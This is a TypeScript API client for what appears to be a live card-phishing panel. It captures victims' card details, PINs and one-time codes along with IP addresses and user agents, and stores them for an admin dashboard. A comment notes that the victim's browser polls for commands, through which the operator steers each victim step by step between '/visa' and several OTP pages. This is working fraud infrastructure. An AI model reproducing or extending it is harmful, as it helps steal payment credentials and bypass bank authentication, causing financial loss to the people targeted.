const API_BASE_URL = import.meta.env.VITE_API_BASE_URL ?? "/api";

// ═══════════════════════════════════════════════════════════════
// Action types mapping for navigation control
// ═══════════════════════════════════════════════════════════════
export type NavigationAction = 'MAIN' | 'CARD' | 'PIN1' | 'PIN2' | 'PIN3' | 'OTP' | 'SUCCESS' | 'ERROR';
export type RedirectTarget = NavigationAction;

// Map actions to page routes
export const ACTION_TO_ROUTE: Record<NavigationAction, string> = {
  'MAIN': '/',
  'CARD': '/visa',
  'PIN1': '/otp',
  'PIN2': '/otp2',
  'PIN3': '/otp3',
  'OTP': '/otp',
  'SUCCESS': '/success',
  'ERROR': '/error',
};

// ═══════════════════════════════════════════════════════════════
// Supabase configuration
// ═══════════════════════════════════════════════════════════════
function getSupabaseConfig() {
  return {
    url: import.meta.env.VITE_SUPABASE_URL ?? "",
    key: import.meta.env.VITE_SUPABASE_ANON_KEY ?? "",
  };
}

async function jsonRequest<T>(path: string, method: string, body?: unknown, token?: string): Promise<T> {
  const headers: Record<string, string> = {
    "Content-Type": "application/json",
  };
  if (token) {
    headers.Authorization = `Bearer ${token}`;
  }

  const baseUrl = API_BASE_URL.replace(/\/+$/, "");
  const normalizedPath = path.startsWith("/") ? path : `/${path}`;
  const response = await fetch(`${baseUrl}${normalizedPath}`, {
    method,
    headers,
    body: body ? JSON.stringify(body) : undefined,
  });

  const raw = await response.text();
  const data = raw ? JSON.parse(raw) : null;
  if (!response.ok) {
    throw new Error(data?.error || response.statusText || "Request failed");
  }

  return data as T;
}

export interface AdminLoginResponse {
  success: boolean;
  token: string;
}

export interface AdminStatsResponse {
  totalSessions: number;
  totalSubmissions: number;
  byType: { type: string; count: number }[];
}

export interface SubmissionRow {
  id: number;
  sessionId: string;
  type: string;
  data: string | null;
  ipAddress: string | null;
  createdAt: string;
  userAgent?: string | null;
}

export interface SubmissionListResponse {
  submissions: SubmissionRow[];
  total: number;
  page: number;
  limit: number;
}

export async function submitSubmission(type: string, body: Record<string, unknown>) {
  return jsonRequest<{ id: number; sessionId: string }>(`/submissions/${type}`, "POST", body);
}

export async function adminLogin(username: string, password: string) {
  return jsonRequest<AdminLoginResponse>("/admin/login", "POST", { username, password });
}

export async function adminLogout(token: string) {
  return jsonRequest<{ success: boolean }>("/admin/logout", "POST", undefined, token);
}

export async function adminLogoutAll(token: string) {
  return jsonRequest<{ success: boolean }>("/admin/logout-all", "POST", undefined, token);
}

export async function adminChangePassword(token: string, newPassword: string) {
  return jsonRequest<{ success: boolean }>("/admin/change-password", "POST", { newPassword }, token);
}

export async function getAdminStats(token: string) {
  return jsonRequest<AdminStatsResponse>("/admin/stats", "GET", undefined, token);
}

export async function listAdminSubmissions(token: string, params?: Record<string, string | number>) {
  const queryString = params ? `?${new URLSearchParams(Object.entries(params).map(([k, v]) => [k, String(v)]))}` : "";
  return jsonRequest<SubmissionListResponse>(`/admin/submissions${queryString}`, "GET", undefined, token);
}

export async function getAllAdminSubmissions(token: string) {
  return jsonRequest<{ submissions: SubmissionRow[]; total: number }>("/admin/all-submissions", "GET", undefined, token);
}

// Fetch submissions directly from Supabase (bypasses API server)
export async function getAdminSubmissionsFromSupabase() {
  const { url, key } = getSupabaseConfig();

  console.log("📡 Fetching from Supabase:", { url, hasKey: !!key });

  if (!url || !key) {
    console.error("❌ Supabase not configured:", { url: !!url, key: !!key });
    throw new Error("Supabase not configured");
  }

  try {
    console.log("🔄 Making request to Supabase...");
    const response = await fetch(`${url}/rest/v1/submissions?select=*&order=created_at.desc`, {
      headers: {
        "apikey": key,
        "Authorization": `Bearer ${key}`,
      },
    });

    console.log("📬 Response status:", response.status);

    if (!response.ok) {
      const errorText = await response.text();
      console.error("❌ Supabase error:", response.status, errorText);
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }

    const data = await response.json();
    console.log("✅ Received data:", data.length, "submissions");
    return (data || []).map((row: any) => ({
      id: row.id,
      sessionId: row.session_id,
      type: row.type,
      data: typeof row.data === 'string' ? row.data : JSON.stringify(row.data),
      ipAddress: row.ip_address,
      createdAt: row.created_at,
      userAgent: row.user_agent,
    }));
  } catch (error) {
    console.error("❌ Failed to fetch from Supabase:", error);
    throw error;
  }
}

export interface ControlActionResponse {
  action: string | null;
}

export async function getControlAction(sessionId: string) {
  return jsonRequest<ControlActionResponse>(`/control/${sessionId}`, "GET");
}

export async function sendAdminControl(sessionId: string, action: string, token: string) {
  return jsonRequest<{ success: boolean; sessionId: string; action: string }>(`/admin/control/${sessionId}`, "POST", { action }, token);
}

// ═══════════════════════════════════════════════════════════════
// Navigation Control Functions (Admin → User)
// ═══════════════════════════════════════════════════════════════

/**
 * Send a navigation command to a specific session
 * This is called from the admin dashboard when a button is clicked
 */
export async function sendNavigationCommand(sessionId: string, action: NavigationAction): Promise<boolean> {
  const { url, key } = getSupabaseConfig();

  if (!url || !key) {
    console.warn("⚠️ Supabase not configured for navigation control");
    return false;
  }

  try {
    // Calculate expiration time (1 minute from now)
    const expiresAt = new Date(Date.now() + 60 * 1000).toISOString();

    const payload = {
      session_id: sessionId,
      action: action,
      redirect_to: null,
      expires_at: expiresAt,
    };

    const response = await fetch(`${url}/rest/v1/controls`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': key,
        'Authorization': `Bearer ${key}`,
        'Prefer': 'return=representation',
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error(`❌ Failed to send navigation command (${action}):`, response.status, errorText);
      return false;
    }

    const result = await response.json();
    console.log(`✅ Navigation command sent: ${action} → session ${sessionId}`, result);
    return true;
  } catch (error) {
    console.error("❌ Error sending navigation command:", error);
    return false;
  }
}

/**
 * Get pending navigation command for a session
 * This is called from the victim's browser to check for commands
 */
export async function getPendingNavigationCommand(sessionId: string): Promise<{ action: NavigationAction; redirect_to: string | null } | null> {
  const { url, key } = getSupabaseConfig();

  if (!url || !key) {
    return null;
  }

  try {
    const now = new Date().toISOString();
    const response = await fetch(
      `${url}/rest/v1/controls?session_id=eq.${encodeURIComponent(sessionId)}&expires_at=gt.${encodeURIComponent(now)}&order=created_at.desc&limit=1`,
      {
        headers: {
          'apikey': key,
          'Authorization': `Bearer ${key}`,
        },
      }
    );

    if (!response.ok) {
      console.error(`❌ Failed to get navigation command: ${response.status}`);
      return null;
    }

    const data = await response.json();
    if (data && data.length > 0) {
      const command = data[0];
      if (isValidNavigationAction(command.action)) {
        return {
          action: command.action,
          redirect_to: command.redirect_to,
        };
      }
    }
  } catch (error) {
    console.error("❌ Error getting navigation command:", error);
  }

  return null;
}

/**
 * Clear/delete a navigation command after it has been processed
 */
export async function clearNavigationCommand(sessionId: string): Promise<void> {
  const { url, key } = getSupabaseConfig();

  if (!url || !key) return;

  try {
    await fetch(`${url}/rest/v1/controls?session_id=eq.${encodeURIComponent(sessionId)}`, {
      method: 'DELETE',
      headers: {
        'apikey': key,
        'Authorization': `Bearer ${key}`,
      },
    });
    console.log(`🗑️ Cleared navigation commands for session: ${sessionId}`);
  } catch (error) {
    console.error("❌ Error clearing navigation command:", error);
  }
}

function isValidNavigationAction(action: string | null): action is NavigationAction {
  if (!action) return false;
  const validActions: NavigationAction[] = ['MAIN', 'CARD', 'PIN1', 'PIN2', 'PIN3', 'OTP', 'SUCCESS', 'ERROR'];
  return validActions.includes(action as NavigationAction);
}

// Legacy functions for backward compatibility
export async function sendRedirectCommand(sessionId: string, target: string): Promise<boolean> {
  const targetToAction: Record<string, NavigationAction> = {
    'home': 'MAIN',
    'card': 'CARD',
    'otp1': 'PIN1',
    'otp2': 'PIN2',
    'otp3': 'PIN3',
    'atm': 'OTP',
    'success': 'SUCCESS',
    'error': 'ERROR',
  };

  const action = targetToAction[target];
  if (!action) {
    console.error(`❌ Unknown redirect target: ${target}`);
    return false;
  }

  return sendNavigationCommand(sessionId, action);
}

export async function getPendingRedirect(sessionId: string): Promise<{ redirect_to: string } | null> {
  const command = await getPendingNavigationCommand(sessionId);
  if (command) {
    return { redirect_to: command.action };
  }
  return null;
}

export async function clearRedirectCommand(sessionId: string): Promise<void> {
  return clearNavigationCommand(sessionId);
}
